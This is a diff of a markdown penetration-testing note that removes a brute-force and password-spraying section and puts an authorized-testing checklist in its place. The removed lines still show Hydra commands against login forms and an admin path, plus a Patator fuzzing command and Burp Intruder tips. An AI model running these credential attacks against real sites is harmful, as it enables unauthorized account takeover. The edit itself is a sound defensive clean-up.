@@ -1,19 +1,10 @@
-# Web Authentication Brute Force / Password Spraying
+# Authentication Testing (Authorized targets only)
 
-## Hydra (POST form)
+## Checklist
+- Enumerate login endpoints and parameters
+- Check account lockout policy
+- Test weak/default creds only if permitted
+- MFA presence / bypass checks (policy-approved only)
 
-hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> \
-http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
-Hydra (GET request)
-
-hydra -l admin -P rockyou.txt <TARGET_IP> http-get /admin/
-Patator
-
-patator http_fuzz method=POST url="http://<TARGET_IP>/login.php" \
-body="username=FILE0&password=FILE1" 0=/root/users.txt 1=/root/passwords.txt
-Burp Suite Intruder
-Use Pitchfork for user/pass combinations
-
-Grep-Match on failure/success strings
-
-Tip: Always validate that brute forcing is in-scope before running.
+## Notes
+- Brute-force and spraying commands intentionally omitted here. Add your internal, approved procedure if allowed by scope.
